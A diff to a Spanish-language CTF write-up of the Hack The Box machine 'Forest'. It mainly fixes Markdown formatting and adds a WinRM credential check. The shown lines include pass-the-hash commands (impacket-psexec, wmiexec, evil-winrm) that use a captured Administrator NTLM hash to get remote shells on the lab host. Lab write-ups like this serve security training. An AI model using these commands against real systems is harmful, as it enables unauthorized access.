@@ -1,5 +1,4 @@
 Máquina: Forest
-
 Dificultad: Easy
 
 
@@ -88,6 +87,8 @@ Vamos a validar las credenciales:
 
 
 Son credenciales válidas. Vamos a comprobar si permite winrm.
+
+``netexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'``
 
 ![Pasted image 20250313125504](https://github.com/user-attachments/assets/2d8ae864-fc25-4152-8595-1cc9c52a1144)
 
@@ -253,29 +254,29 @@ Listo.
 Dado que conocemos el hash NTLM válido de Administrator, y como nos pone Pwn3d, podemos ingresar vía psexec (para acceder como NTAuthority\System) o wmiexec (para acceder como Adminsitrator), o winRM a través de la técnica Pass The Hash.
 
 - psexec:
-- 
+
 ``impacket-psexec Administrator@10.10.10.161 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'``
 
 ![Pasted image 20250313161653](https://github.com/user-attachments/assets/80c51f5a-09e1-490e-9ae8-648b8df85f29)
 
 
 - wmiexec:
-- 
-``impacket-wmiexec Administrator@10.10.10.161 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'
+
+``impacket-wmiexec Administrator@10.10.10.161 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'``
 
 ![Pasted image 20250313161707](https://github.com/user-attachments/assets/dd55e932-5137-458e-ab18-741be72165ec)
 
 
 - evilwinrm:
-- 
+
 Primero deberíamos validar que nos podemos conectar por winrm
 
-``netexec winrm 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
+``netexec winrm 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'``
 
 ![Pasted image 20250313161332](https://github.com/user-attachments/assets/28ecf169-59bd-4be2-b576-882f3bf2057d)
 
 
-``evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
+``evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'``
 
 ![Pasted image 20250313161907](https://github.com/user-attachments/assets/c68e5a25-7f45-461b-8d64-581634adcac7)
 
